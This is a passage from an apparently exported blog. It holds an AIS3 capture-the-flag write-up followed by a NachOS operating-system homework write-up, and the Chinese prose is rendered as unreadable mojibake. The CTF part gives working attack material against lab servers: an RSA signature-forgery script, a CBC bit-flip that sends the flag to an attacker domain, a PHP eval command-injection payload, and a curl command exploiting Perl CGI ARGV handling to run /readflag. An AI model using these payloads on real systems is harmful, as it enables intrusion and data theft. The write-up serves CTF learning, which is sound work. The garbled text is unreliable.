c;mod;N$ï¼Œæ‰€ä»¥é€™è£¡çš„ sign å…¶å¯¦æ²’ç”¨ä»€éº¼ç‰¹åˆ¥çš„ç®—æ³•ï¼Œå®˜æ–¹ä¹Ÿä¸æ¨è–¦ç›´æ¥ä½¿ç”¨ sign ï¼Œæ‡‰è©²è¦ç”¨ PKCS ä¹‹é¡çš„æ±è¥¿ä¾†ç°½æ‰å° é€™é¡Œçš„å•é¡Œåœ¨æ–¼ï¼Œä»–æ²’æœ‰é©—è­‰å…¨éƒ¨çš„è¨Šæ¯ï¼Œä»–ç›´æ¥ split æ‰¾ç¬¬å››å€‹å…ƒç´ ï¼Œçœ‹ä»–æ˜¯ä¸æ˜¯ 10ï¼Œå› æ­¤æˆ‘å€‘åªè¦é€ å‡ä¸€å€‹ç¬¬å››å€‹å…ƒç´  &gt; 10 çš„æ˜æ–‡å°±å¥½äº†ï¼Œè¦é€ å‡ç°½ç« æˆ‘å€‘è¦é€šékey.verifyï¼Œä½†æ˜¯å› ç‚ºæˆ‘å€‘æœ‰å…¬é‘° (N, e)ï¼Œæˆ‘å€‘å¯ä»¥é€†éä¾†ç©ï¼Œåªè¦éš¨ä¾¿äº‚å¼„ä¸€å€‹å¯†æ–‡sï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€å€‹äº‚ä¸ƒå…«ç³Ÿçš„æ˜æ–‡ m &#x3D; ($s^e$ mod N)ï¼Œé€™æ±è¥¿ä¸€å®šæœƒé€šékey.verifyï¼Œç„¶å¾Œæœ‰æ²’æœ‰é€šé &gt; 10 å°±æ˜¯é é‹æ°£ï¼Œæ‰€ä»¥ä¸€ç›´æ’åˆ°éå°±æœƒæœ‰ flag äº† fake_s = &quot;&quot;c = 0while True: try: cc = int(&#x27;&#x27;.join(c)) m = pow(cc, e, n) test = long_to_bytes(m) bucks = int(test.split()[3]) print bucks, if bucks &gt; 10: fake_s = str(cc) break except EOFError: break except: pass c += 1print str(m)print fake_s print &quot;find&quot; AIS3{D0cT0R StRaNG3 - F0rgERy ATTaCk Ag4InsT RSa DIgital SigNatUrE} Crypto-4:EFAILé€™é¡Œè…³æœ¬å¯«åˆ°ä¸€åŠï¼Œç¸½ä¹‹åˆ©ç”¨ CBC çš„å¼±é»ï¼Œåœ¨çŸ¥é“æ˜æ–‡çš„æƒ…æ³ä¸‹ï¼Œæˆ‘å€‘å¯ä»¥æ›¿æ›å¯†æ–‡ä¾†ä¿®æ”¹æ˜æ–‡ï¼Œä¾‹å¦‚æˆ‘å€‘æœ‰ $C_0, P_1, Fake$ï¼Œæˆ‘å€‘æŠŠæœ¬ä¾†$C_0$çš„åœ°æ–¹æ›¿æ›æˆ$C_0 \\oplus P_1 \\oplus Fake$ï¼Œé€™æ¨£$C_1$è§£å¯†å®Œå¾Œæœƒ xor åˆ°éŒ¯èª¤çš„å€¼ï¼Œè®“æœ¬ä¾†çš„ $C_0\\oplus P_1$ç„¡æ³•é‚„åŸæˆ$P_1$è€Œè®Šæˆ$Fake$ï¼Œç„¶å¾Œä»–æœ‰æä¾›webé€™å€‹ä¸Šç¶²çš„æŒ‡ä»¤ï¼ŒæŠŠflagå‰é¢æ”¹æˆweb &#39;mydoman.twï¼Œæˆ‘å€‘å°±å¯ä»¥å»è‡ªå·±çš„ domain æ’ˆåˆ° flagï¼Œæ³¨æ„åˆ°å¾Œé¢éå¹¾è¡Œæœ‰å¥è‹±æ–‡æœ‰&#39;ï¼Œä»–æœƒæŠŠé€™æ•´æ®µéƒ½ç•¶ç¶²å€è¨ªå•ï¼Œæ‰€ä»¥ä¸ç”¨è‡ªå·±å†åŠ ä¸€å€‹&#39;ä¾†é–‰åˆ Web-1:warmupé€£åˆ° http://104.199.235.135:31331/index.php\\?p=7 ç™¼ç¾ header è£¡é¢æœ‰ä¸€æ¬„ Partial-Flag:dï¼Œæ¨æ¸¬ URL è£¡é¢çš„ p è¡¨ç¤ºæ˜¯ flag ä¸­çš„ç¬¬ p å€‹å­—å…ƒï¼Œæ‰€ä»¥è®Šå‹• index æ‹¼å‡º flag for i in &#123;0..50&#125;do curl -v http://104.199.235.135:31331/index.php\\?p\\=$i 2&gt;&amp;1 | grep Flag | awk &#x27;&#123;printf $3&#125;&#x27; | tr -d &#x27;\\r&#x27; &gt;&gt; flag.txt done AIS3{g00d! u know how 2 check H3AD3R fie1ds.} Web-2:hiddenå…ˆåˆ° robots.txt æœƒæ‰¾åˆ°ä¸€å€‹é€£çµå«åš _hidden_flag_.phpä»–æœƒå€’æ•¸å€‹ 1x ç§’ç„¶å¾Œè·³å‡ºä¸€å€‹æŒ‰éˆ•åˆ°ä¸‹ä¸€é ä»–å…¶å¯¦é€å‡ºäº†ä¸€å€‹æœ‰å…©å€‹éš±è—æ¬„ä½ cï¼Œs çš„è¡¨å–®ï¼Œç”¨ä¾†å–å¾—ä¸‹æ¬¡çš„ cï¼Œså€¼ï¼Œç›´åˆ°æŸå€‹é—œéµé»å°±æœƒçµ¦ flag äº†å¯«å€‹è…³æœ¬è®“ä»–é£›ä¸€æœƒå…’ï¼Œè¦è·‘ 17xxx æ¬¡æ‰çµæŸ import requestsimport rer = requests.get(&quot;http://104.199.235.135:31332/_hidden_flag_.php&quot;)while &quot;no flag here&quot; in r.text: m = re.findall(&#x27;value=&quot;([A-Za-z0-9]*)&quot;&#x27;,r.text) for i in m: print i r = requests.post(&#x27;http://104.199.235.135:31332/_hidden_flag_.php&#x27;, data = &#123;&#x27;c&#x27;:m[0],&#x27;s&#x27;:m[1]&#125;) print r.textprint r.headers AIS3{g00d_u_know_how_2_script_4_W3B_3e02c41e2d6243765575b12442bc8480} Web-3:sushié¡Œç›®æ˜¯ phpï¼Œé—œéµçš„ä¸€è¡Œæ˜¯ä»–ç”¨evalåŒ…ä½äº†dieï¼Œé€™è£¡æˆ‘å€‘å¯ä»¥ç”¨ php ç¥ç§˜çš„ç‰¹æ€§ï¼Œåƒè€ƒ Orange çš„ blogå…¶ä¸­@æ˜¯ç”¨ä¾†æŠ‘åˆ¶éŒ¯èª¤è¨Šæ¯ï¼Œç„¶å¾Œæœ‰é™åˆ¶å­—ä¸²é•·åº¦ä¸èƒ½è¶…é 16 ï¼Œè€Œä¸”ä¸å¯ä»¥åŒ…å« &#39;ï¼Œ&quot;å…ˆçœ‹ç›®éŒ„ä¸‹æœ‰ä»€éº¼æª”æ¡ˆ http://104.199.235.135:31333/?%F0%9F%8D%A3=$&#123;@print(`ls`)&#125; ç›®éŒ„ä¸‹æœ‰ phpinfo.phpï¼Œindex.phpï¼Œflag_name_1s_t00_l0ng_QAQQQQQQï¼Œé€™é‚Šç”¨ä½ç«¯è§£æ³•ï¼Œç›´æ¥å­˜å–XDDD http://104.199.235.135:31333/flag_name_1s_t00_l0ng_QAQQQQQQ ä¸éå¦‚æœä¸å¹¸çš„ä¸èƒ½ç›´æ¥å­˜å–ï¼Œå…¶å¯¦å¯ä»¥ç”¨æˆªæ–·çš„æ–¹å¼ä¾†è®“ php èª¤åˆ¤æˆ‘å€‘æ”¾é€²å» GET çš„å­—ä¸²é•·åº¦ï¼Œä¾†é€²è¡Œä»»æ„é•·åº¦çš„ command injection AIS3{php_is_very_very_very_easyyyyyy} Web-4:perljamé€™é¡Œçœ‹èµ·ä¾†ç©ºç©ºå¦‚ä¹Ÿï¼Œä¸éæœ‰ git leak çš„å•é¡Œï¼Œç¸½ä¹‹æŠ“ä¸‹ä¾†æœƒæ‰¾åˆ°ä¸€æ®µé—œéµçš„ upload ç¨‹å¼ç¢¼ use strict;use warnings;use CGI;my $cgi = CGI-&gt;new;print $cgi-&gt;header();print &quot;&lt;body style=\\&quot;background: #caccf7 url(&#x27;https://i.imgur.com/Syv2IVk.png&#x27;);padding: 30px;\\&quot;&gt;&quot;;print &quot;&lt;p style=&#x27;color:red&#x27;&gt;No BUG Q_____Q&lt;/p&gt;&quot;;print &quot;&lt;br&gt;&quot;;print &quot;&lt;pre&gt;&quot;;if( $cgi-&gt;upload(&#x27;file&#x27;) ) &#123; my $file = $cgi-&gt;param(&#x27;file&#x27;); while(&lt;$file&gt;) &#123; print &quot;$_&quot;; &#125;&#125;print &quot;&lt;/pre&gt;&quot;; å¯ä»¥åƒè€ƒ black hat çš„ä¸€å€‹ç°¡å ±ï¼Œæˆ‘å€‘å¯ä»¥é€ å‡ä¸€å€‹ file ä¾†åšåˆ° RCEæœ¬é¡Œä¸èƒ½ç›´æ¥cat flagï¼Œæ¬Šé™ä¸å¤ ï¼Œåœ¨æ ¹ç›®éŒ„ä¸‹é¢æœ‰æ”¯å¯ä»¥è®€å– flag çš„ç¨‹å¼ï¼Œæˆ‘å€‘è¦åŸ·è¡Œä»–ä¾†å–å¾— flag echo &quot;trash&quot; | curl -F &quot;file=ARGV&quot; -F &quot;file=@-&quot; &quot;http://104.199.235.135:31334/cgi-bin/index.cgi?/readflag|&quot; AIS3{here_is_your_flag} Misc-1:welcomeçœ‹æ•™å­¸å½±ç‰‡ï¼Œè£¡é¢æœ‰ flag AIS3{Maybe_This_is_the_Flag_You_Want} Misc-2:flagä¸‰éš»å‡ flagï¼Œåœ–ç‰‡ä¸Šçš„ï¼Œstrings å‡ºä¾†çš„ï¼Œ pkcrack å‡ºä¾†çš„éƒ½æ˜¯å‡çš„ã€‚æœ¬ä¾†å°±è¦ºå¾—ä»–çµ¦çš„åœ–ä¸Šçš„é»é»çœ‹èµ·ä¾†å¾ˆä¸æ•´é½Šï¼ŒçŒœæ¸¬æ˜¯æ‘©æ–¯é›»ç¢¼ï¼Œåƒå®Œæ™šé¤å›ä¾†ä¸€ä¸‹å°±éäº†ï¼Œä¸éåœ–ç‰‡æ˜¯ jpeg å£“ç¸®çš„é—œä¿‚æœ‰é»æ¨¡ç³Šï¼Œç¸½ä¹‹å°è‘—ç¿»è­¯å‡ºä¾†å°±æ˜¯ flag AIS3{YOUFINDTHEREALFLAGOHYEAH} Misc-3:svegamp3 éŸ³è¨Šéš±å¯«ï¼Œç”¨ MP3stego åŠ å¯†çš„ï¼Œæ²’æœ‰è¨­å®š password ï¼Œdecode ä¸‹å»å°±æ˜¯ flag AIS3{I_HearD_imPlIeD_Fl46_1N_TH3_5oN6} Misc-4:blindé€™é¡Œé‚„æ²’ä¾†å¾—åŠæƒ³ï¼Œè½ Maojui è¬›äº†å€‹å¤§æ¦‚ï¼Œæ˜¯æœ‰è¶£çš„ä¸€é¡Œã€‚","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"}]},{"title":"OS::NachOS::HW1","slug":"OS-NachOS-HW1","date":"2018-05-28T16:25:15.000Z","updated":"2022-10-16T06:34:59.000Z","comments":true,"path":"tw/OS-NachOS-HW1/","permalink":"http://blog.terrynini.tw/tw/OS-NachOS-HW1/","excerpt":"InstallNachOS å¿…é ˆè¦è£åœ¨ 32bits çš„ç’°å¢ƒä¸‹ï¼Œå¦‚æœè¦è£åœ¨ 64bits ä¸‹è¦é€²è¡Œ patch patch -p1 &lt; nachos-linux-64bit.diff","text":"InstallNachOS å¿…é ˆè¦è£åœ¨ 32bits çš„ç’°å¢ƒä¸‹ï¼Œå¦‚æœè¦è£åœ¨ 64bits ä¸‹è¦é€²è¡Œ patch patch -p1 &lt; nachos-linux-64bit.diff Multiprogrammingåœ¨é‚„æœªå° NachOS é€²è¡Œä¿®æ”¹çš„æ™‚å€™ï¼ŒåŸ·è¡Œ test1ã€test2 æ™‚æœƒç™¼ç¾è·Ÿ source code çš„è¡Œç‚ºä¸ä¸€æ¨£ã€‚ ./nachos â€“e ../test/test1 â€“e ../test/test2 å› ç‚ºåŸæœ¬çš„ NachOS ä¸¦æ²’æœ‰ç‚ºå¤šå€‹ç¨‹å¼åšè¨˜æ†¶é«”çš„ç®¡ç†ï¼Œé›–ç„¶æœ‰é–‹å•Ÿè™›æ“¬è¨˜æ†¶é«”ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šæ²’æœ‰ä½œç‚ºï¼Œæ‰€ä»¥ç•¶å¤šä»½ç¨‹å¼åŒæ™‚åŸ·è¡Œæ™‚å°±æœƒé‡ç–Šåˆ°å…¶ä»–ç¨‹å¼æ­£åœ¨ä½¿ç”¨çš„ page ï¼Œç„¶å¾Œç™¼ç”ŸéŒ¯èª¤ï¼Œç‚ºæ­¤æˆ‘å€‘è¦ä¿®æ”¹ code/userprog/addrspace.ccã€code/userprog/addrspace.hï¼Œä½¿ç¨‹å¼çš„è™›æ“¬è¨˜æ†¶é«”æ˜ å°„åˆ°æ²’æœ‰äººä½¿ç”¨çš„å¯¦é«”è¨˜æ†¶é«”ï¼Œè€Œä¸æ˜¯äº’ç›¸ç³¾çºã€‚ é¦–å…ˆå¾ addrspace.cc é–‹å§‹ï¼Œå»ºæ§‹å¼ç›´æ¥å¼„äº†ä¸€å€‹è·Ÿå¯¦é«”è¨˜æ†¶é«”ä¸€æ¨£å¤§çš„ pageTable ï¼Œ ç„¶å¾Œé‚„å…¨æ•¸æ˜ å°„ï¼Œä½†æ˜¯å…¶å¯¦æˆ‘å€‘çš„ç¨‹å¼æ²’é€™éº¼å¤§ï¼Œæˆ‘å€‘åªè¦åˆ†é…åˆ°è·Ÿç¨‹å¼ä¸€æ¨£å¤§å°±å¥½äº†ï¼Œä¸éç¨‹å¼çš„å¤§å°å¿…é ˆè¦åˆ°è®€äº†æª”æ¡ˆæ ¼å¼æ‰æœƒçŸ¥é“ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æŠŠé€™æ•´æ®µ code è¨»è§£æ‰ï¼ŒæŠŠæ˜ å°„è¨˜æ†¶é«”é€™ä»¶äº‹æŒªåˆ° AddrSpace::Load ä¸­ã€‚ é‚„æœ‰ä¸€è¡Œ bzero(kernel-&gt;machine-&gt;mainMemory, MemorySize); ä¸æ›‰å¾—ç‚ºä»€éº¼è¢«è¨»è§£äº†ï¼Œä¸éæ‡‰è©²è¦æ¸…ç©ºè¨˜æ†¶é«”æ‰å°ï¼Œä½†å°‡è¨˜æ†¶é«”åˆ†çµ¦å¤šå€‹ç¨‹å¼å¾Œå°±ä¸èƒ½é€™æ¨£æš´åŠ›çš„æŠŠæ‰€æœ‰è¨˜æ†¶é«”æ¸…é›¶ï¼Œæ‰€ä»¥æˆ‘åœ¨å¾Œé¢çš„ç¨‹å¼æœƒæ¯åˆ†é…ä¸€é å°±æ¸…ç©ºä¸€é çš„è¨˜æ†¶é«”ã€‚ code/userprog/addrspace.ccAddrSpace::AddrSpace()&#123; pageTable = new TranslationEntry[NumPhysPages]; for (unsigned int i = 0; i &lt; NumPhysPages; i++) &#123; pageTable[i].virtualPage = i; // for now, virt page # = phys page # pageTable[i].physicalPage = i;// pageTable[i].physicalPage = 0; pageTable[i].valid = TRUE;// pageTable[i].valid = FALSE; pageTable[i].use = FALSE; pageTable[i].dirty = FALSE; pageTable[i].readOnly = FALSE; &#125; // æ¸…ç©ºè¨˜æ†¶é«”ï¼Œä½†æ˜¯ä¸çŸ¥é“ç‚ºä»€éº¼è¢«è¨»è§£æ‰äº†ã€‚// bzero(kernel-&gt;machine-&gt;mainMemory, MemorySize);&#125; æ¥ä¸‹ä¾†åœ¨ AddrSpace::Load ä¸­æˆ‘å€‘æœ‰é€™æ¨£ä¸€å€‹ ASSERTï¼ŒnumPages å°±æ˜¯ç¨‹å¼æ‰€éœ€è¦çš„ page æ•¸é‡ï¼Œç”¨ä¾†åˆ¤æ–·æ˜¯å¦æœ‰è¶…éå¯¦é«”è¨˜æ†¶é«”çš„å¤§å°ï¼Œè¶…éå°±å™´exceptionï¼Œå› ç‚ºç­‰ç­‰æˆ‘å€‘è¦æŠŠè¨˜æ†¶é«”åˆ†çµ¦å¤šå€‹ç¨‹å¼ï¼Œæˆ‘å€‘è¦æ”¹æˆ &lt;= ç©ºé–’çš„ page æ‰å°ã€‚ code/userprog/addrspace.ccASSERT(numPages &lt;= NumPhysPages); åœ¨å¾€å¾Œä¸€é»æˆ‘å€‘æœ‰ä¸€æ®µ code æŠŠæˆ‘å€‘çš„ code æ®µè·Ÿ data æ®µ load é€²è¨˜æ†¶é«”ï¼Œä½†æ˜¯é€™è£¡å¡«çš„æ˜¯ virtualAddr ï¼Œæœ¬ä¾†é€™æ¨£å¡«æ˜¯å› ç‚ºè™›æ“¬è¨˜æ†¶é«”æœ¬æ²’åšäº‹ï¼Œå®Œå…¨è·Ÿå¯¦é«”è¨˜æ†¶é«”ä¸€æ¨£ â€”â€” é‚„è¨˜å¾—å»ºæ§‹å¼è£¡ pageTable[i].virtualPage = i; // for now, virt page # = phys page #ï¼Ÿä½†ç¾åœ¨æˆ‘å€‘å¿…é ˆè¦æ›ç®—è™›æ“¬è¨˜æ†¶é«”å°æ‡‰çš„å¯¦é«”è¨˜æ†¶é«”ä½ç½®å†è®€å…¥é€™æ¨£æ‰æ˜¯æ­£ç¢ºçš„ã€‚ code/userprog/addrspace.cc// then, copy the code and data segments into memoryif (noffH.code.size &gt; 0) &#123; DEBUG(&#x27;a&#x27;, &quot;Initializing code segment, at 0x%x, size %d\\n&quot;,noffH.code.virtualAddr, noffH.code.size); executable-&gt;ReadAt(&amp;(machine-&gt;mainMemory[noffH.code.virtualAddr]),noffH.code.size, noffH.code.inFileAddr);&#125;if (noffH.initData.size &gt; 0) &#123; DEBUG(&#x27;a&#x27;, &quot;Initializing data segment, at 0x%x, size %d\\n&quot;,noffH.initData.virtualAddr, noffH.initData.size); executable-&gt;ReadAt(&amp;(machine-&gt;mainMemory[noffH.initData.virtualAddr]),noffH.initData.size, noffH.initData.inFileAddr);&#125; å› æ­¤å…ˆæ–°å¢å…© static è®Šæ•¸ï¼ˆ static æ˜¯é€™å€‹ class æ‰€å…±äº«ï¼‰ï¼Œç”¨ä¾†è¨˜éŒ„æ‰€æœ‰å¯¦é«”é çš„ä½¿ç”¨ç‹€æ³ï¼Œä»¥åŠç•¶å‰é‚„æœ‰å¤šå°‘å¯¦é«”é æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œä¸¦è¨˜å¾—åœ¨ addrspace.cc ä¸­å° static è®Šæ•¸åšåˆå§‹åŒ–ã€‚ code/userprog/addrspace.hclass AddrSpace &#123; ... private: ... static bool PhyPageStatus[NumPhysPages]; static int NumFreePages;&#125; code/userprog/addrspace.cc#define PAGE_OCCU true#define PAGE_FREE falsebool AddrSpace::PhyPageStatus[NumPhysPages] = &#123;PAGE_FREE&#125;;int AddrSpace::NumFreePages = NumPhysPages; ä¸¦ä¸”æ ¹æ“šå‰›å‰›æåˆ°çš„æ¯ä¸€é»å° addrspace.cc åšä¿®æ”¹ã€‚ æ¸…é™¤å»ºæ§‹å¼æŠŠæ²’å¿…è¦çš„æ˜ å°„æ‹¿æ‰ï¼š code/userprog/addrspace.ccAddrSpace::AddrSpace()&#123;&#125; åˆ†é…å¯¦é«”é é€™é‚Šå¯ä»¥è‡ªå·±ç¶­è­·ä¸€å€‹ pool ï¼ŒæŠŠå‰› free æ‰çš„ page ç”¨ linklist å­˜èµ·ä¾†ï¼Œè¦ç”¨å°±å…ˆå»é€™å€‹åœ°æ–¹æ‰¾ï¼Œä¸éæ²’é—œä¿‚ï¼Œæˆ‘å€‘å°±ç”¨æœ€æ¨¸ç´ ï¼ˆ naive ï¼‰çš„æ–¹æ³• â€”â€” ä¸€å€‹ä¸€å€‹çœ‹ï¼Œæœ‰å¯ä»¥ç”¨çš„å°±ç›´æ¥æŠ“ä¾†ç”¨ã€‚ é€™é‚Šæˆ‘ç”¨äº† bzero(&amp;kernel-&gt;machine-&gt;mainMemory[idx * PageSize], PageSize); ä¾†æ¸…é›¶åˆ†é…åˆ°çš„ pageï¼Œå› ç‚ºæˆ‘æ²’çœ‹è¼‰å…¥çš„å¯¦ä½œï¼ˆ ReadAt ï¼‰ï¼Œä½†æ˜¯æ­£å¸¸æ”¾å…¥ memory æ™‚ï¼Œå¦‚æœç¨‹å¼ä¸æ»¿ä¸€å€‹ page ï¼Œé‚£æ‡‰è©²è¦æœ‰ Null Padding ï¼Œå…ˆæŠŠè¨˜æ†¶é«”æ¸…é›¶å°±èƒ½ä¿è­‰å‰©é¤˜çš„éƒ¨åˆ†éƒ½æ˜¯é›¶äº†ã€‚ code/userprog/addrspace.ccbool AddrSpace::Load(char *fileName)&#123; ... //æª¢æŸ¥æ˜¯å¦æœ‰è¶³å¤ çš„ç©ºé–’å¯¦é«”é  ASSERT(numPages &lt;= NumFreePages); //é€²è¡Œåˆ†é… pageTable = new TranslationEntry[numPages]; for(unsigned int i = 0, idx = 0; i &lt; numPages; i++) &#123; pageTable[i].virtualPage = i; while(idx &lt; NumPhysPages &amp;&amp; AddrSpace::PhyPageStatus[idx] == PAGE_OCCU) idx++; AddrSpace::PhyPageStatus[idx] = PAGE_OCCU; AddrSpace::NumFreePages--; //æ¸…ç©ºå³å°‡åˆ†é…çš„ page bzero(&amp;kernel-&gt;machine-&gt;mainMemory[idx * PageSize], PageSize); pageTable[i].physicalPage = idx; pageTable[i].valid = true; pageTable[i].use = false; pageTable[i].dirty = false; pageTable[i].readOnly = false; &#125; DEBUG(dbgAddr, &quot;Initializing address space: &quot; &lt;&lt; numPages &lt;&lt; &quot;, &quot; &lt;&lt; size); ...&#125; æ›´æ”¹è®€å–ä½ç½®æœ¬ä¾†æ˜¯ç›´æ¥æ”¾å…¥æª”æ¡ˆçµæ§‹è£¡é¢ç´€éŒ„çš„ virtualAddr ï¼Œä½†æ˜¯é‚£æ˜¯å› ç‚ºé‚„æ²’æœ‰è¨­å®šå¥½ï¼Œé€™è£¡æˆ‘å€‘è¦æ‰¾å‡ºæ˜ å°„å¾Œçš„å¯¦é«”ä½ç½®ï¼Œæ‰€ä»¥æˆ‘å€‘æŠ“ virtualAddrå…ˆé™¤ PageSize æ±‚å¾—æ˜¯ç¬¬å¹¾å€‹ pageï¼Œç„¶å¾Œç´¢å¼• pageTable æ‰¾åˆ°å°æ‡‰çš„å¯¦é«”é æ˜¯ç¬¬å¹¾é ï¼Œæ¥è‘—ä¹˜ä¸Šæ¯å€‹ page çš„å¤§å°å¾—åˆ°è©²å¯¦é«”é çš„å¯¦é«”è¨˜æ†¶é«”ï¼Œé€™æ™‚æˆ‘å€‘å·²ç¶“çŸ¥é“åœ¨ç¬¬å¹¾å€‹å¯¦é«”é äº†ï¼Œä¸éæˆ‘å€‘ä¸çŸ¥é“åœ¨é€™ä¸€é çš„å“ªè£¡ï¼Œæ‰€ä»¥æˆ‘å€‘æ‹¿æœ¬ä¾†çš„ virtualAddr mod PageSize æ±‚å¾—åœ¨ page å…§çš„åç§»ï¼ŒåŠ ä¸Šå‰›å‰›æ‹¿åˆ°çš„å¯¦é«”é ï¼Œå°±æ˜¯å°æ‡‰çš„å¯¦é«”ä½å€ã€‚ code/userprog/addrspace.ccbool AddrSpace::Load(char *fileName)&#123; ... DEBUG(dbgAddr, &quot;Initializing address space: &quot; &lt;&lt; numPages &lt;&lt; &quot;, &quot; &lt;&lt; size); if (noffH.code.size &gt; 0) &#123; DEBUG(dbgAddr, &quot;Initializing code segment.&quot;); DEBUG(dbgAddr, noffH.code.virtualAddr &lt;&lt; &quot;, &quot; &lt;&lt; noffH.code.size); executable-&gt;ReadAt( &amp;(kernel-&gt;machine-&gt;mainMemory[pageTable[noffH.code.virtualAddr/PageSize].physicalPage * PageSize + (noffH.code.virtualAddr%PageSize)]), noffH.code.size, noffH.code.inFileAddr); &#125; if (noffH.initData.size &gt; 0) &#123; DEBUG(dbgAddr, &quot;Initializing data segment.&quot;); DEBUG(dbgAddr, noffH.initData.virtualAddr &lt;&lt; &quot;, &quot; &lt;&lt; noffH.initData.size); executable-&gt;ReadAt( &amp;(kernel-&gt;machine-&gt;mainMemory[pageTable[noffH.initData.virtualAddr/PageSize].physicalPage * PageSize + (noffH.initData.virtualAddr%PageSize)]), noffH.initData.size, noffH.initData.inFileAddr); &#125; delete executable; // close file return TRUE; // success&#125; é‡‹æ”¾å¯¦é«”é åŸ·è¡ŒçµæŸï¼Œé‡‹æ”¾æ‰æˆ‘å€‘ä½¿ç”¨çš„å¯¦é«”é ï¼Œå¾Œé¢çš„ç¨‹å¼æ‰èƒ½ä½¿ç”¨ã€‚ code/userprog/addrspace.ccAddrSpace::~AddrSpace()&#123; //é‡‹æ”¾æœ¬ç¨‹å¼ä½”ç”¨çš„å¯¦é«”é  for(int i = 0; i &lt; numPages; i++)&#123; AddrSpace::PhyPageStatus[pageTable[i].physicalPage] = PAGE_FREE; AddrSpace::NumFreePages++; &#125; delete pageTable;&#125; æ¸¬è©¦ä¿®æ”¹å¾ŒåŸ·è¡Œå°±æ­£å¸¸äº† $ ./nachos -e ../test/test1 -e ../test/test2Total threads number is 2Thread ../test/test1 is executing.Thread ../test/test2 is executing.Print integer:9Print integer:8Print integer:7Print integer:20Print integer:21Print integer:22Print integer:23Print integer:24Print integer:6return value:0Print integer:25return value:0No threads ready or runnable, and no pending interrupts.Assuming the program completed.Machine halting!Ticks: total 300, idle 8, system 70, user 222Disk I/O: reads 0, writes 0Console I/O: reads 0, writes 0Paging: faults 0Network I/O: packets received 0, sent 0 System call : Sleepsyscall ä¸»è¦æµç¨‹é¦–å…ˆæˆ‘å€‘è¦å…ˆå¹«æˆ‘å€‘çš„ syscall ç·¨è™Ÿï¼Œç„¶å¾Œç”¨çµ„èªå®šç¾© sleep çš„è¡Œç‚ºï¼ˆå› ç‚ºè¦ç”¨åˆ°çµ„èªçš„ syscall ï¼Œç•¶ç„¶ä½ ä¹Ÿå¯ä»¥ç”¨ gcc çš„å…§è¯çµ„èªï¼Œä½†æ˜¯æ²’å¿…è¦ï¼‰ï¼Œå°±æ˜¯è®“ c++ è·Ÿ mips ä¸­çš„ function äº’ç›¸å‘¼å«ï¼Œæ‰€ä»¥åœ¨ compile çš„æ™‚å€™è¦è®“ä»–å€‘çŸ¥é“ symbol åœ¨å“ªè£¡ã€‚ code/userprog/syscall.h#define SC_ThreadFork 9#define SC_ThreadYield 10#define SC_PrintInt 11#define SC_Sleep 12...void PrintInt(int number); //my System Callvoid Sleep(int number); ä»– lib æ”¾çš„ä½ç½®æœ‰é»è©­ç•°ï¼Œä¸éé€™å°±æ˜¯è‡ªå·±å¯¦ä½œçš„ c libraryï¼Œè‡ªå·±åˆ»ä½œæ¥­ç³»çµ±çš„è©±ä¹Ÿæœƒç¢°åˆ°\u001dï¼ˆMyLittle-OSï¼‰ï¼Œé€™è£¡æˆ‘å€‘è¦æŠŠ Sleep é€™å€‹ symbol å°å‡ºï¼Œé€™æ¨£ c++ å¯«çš„éƒ¨åˆ†æ‰èƒ½æ‰¾å¾—åˆ°ï¼Œå› æ­¤æœ‰ .globl Sleepï¼Œè€Œ.ent Sleepæ˜¯èªª Sleep çš„ entry åœ¨é€™è£¡ã€‚ é€™è£¡é‚„ä¸ç®— syscall ï¼Œå°±åªæ˜¯ä¸€å€‹ç³»çµ± APIï¼Œåªæ˜¯æŠŠ syscall ç·¨è™Ÿæ”¾é€² $2ï¼Œç„¶å¾Œé€²è¡Œ syscallï¼Œé€™è£¡é‚„æ²’æœ‰é™·å…¥æ ¸å¿ƒã€‚ code/test/start.s/* Start.s * * Assembly language assist for user programs running on top of Nachos. * ...*/... .globl Sleep .ent SleepSleep: addiu $2,$0,SC_Sleep syscall j $31 .end Sleep åœ¨é€²è¡Œå®Œ syscall ï¼Œé™·å…¥æ ¸å¿ƒå¾Œï¼ŒNachOS è² è²¬è™•ç†é€™å¡Šçš„æ˜¯ exception.ccï¼Œæˆ‘å€‘è¦ä¾†å®šç¾©æ”¶åˆ° SC_Sleep é€™å€‹ syscall ç·¨è™Ÿçš„æ™‚å€™æ‰€è¦åšçš„è¡Œç‚ºã€‚å¾å…¶ä»–æœ¬ä¾†å®šç¾©å¥½çš„ case ä¾†çœ‹ï¼Œå‚³åƒæ‡‰è©²æ˜¯æ”¾åœ¨ 4ï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿç…§è‘—åšï¼Œç„¶å¾Œé€™è£¡è¦èªªä¸€ä¸‹ä¸­æ–·ã€‚ code/userprog/exception.cc// exception.cc // Entry point into the Nachos kernel from user programs.// There are two kinds of things that can cause control to// transfer back to here from user code:// case SC_PrintInt: val=kernel-&gt;machine-&gt;ReadRegister(4); cout &lt;&lt; &quot;Print integer:&quot; &lt;&lt;val &lt;&lt; endl; return; case SC_Sleep: val=kernel-&gt;machine-&gt;ReadRegister(4); cout &lt;&lt; &quot;Sleep Time:&quot; &lt;&lt; val &lt;&lt; &quot;(ms)&quot; &lt;&lt; endl; kernel-&gt;alarm-&gt;WaitUntil(val); return; ä¸­æ–·å¸¸å¼åœ¨é–‹ç™¼ä½œæ¥­ç³»çµ±çš„æ™‚å€™æˆ‘å€‘å¯ä»¥é€éä¸­æ–·æ§åˆ¶å™¨ï¼Œä¾‹å¦‚ Intel 8259Aï¼Œä¾†é®è”½æŸäº›ä¸­æ–·è¨Šè™Ÿï¼Œå…¶ä¸­åŒ…æ‹¬æ™‚è„ˆï¼Œå¦‚æœæˆ‘å€‘ä¸é®è”½å®ƒçš„è©±ï¼Œè™•ç†å™¨å°±æœƒæ”¶åˆ°æºæºä¸æ–·çš„æ™‚è„ˆä¸­æ–·ï¼ŒNachOSæœ‰ç”¨è»Ÿé«”åšé¡ä¼¼çš„äº‹æƒ…ï¼Œè€Œå¤–éƒ¨é€™å€‹æ™‚è„ˆï¼Œå°±æ˜¯ç”¨è»Ÿé«”æ¨¡æ“¬çš„ã€‚ code/machine/timer.cc// timer.cc // 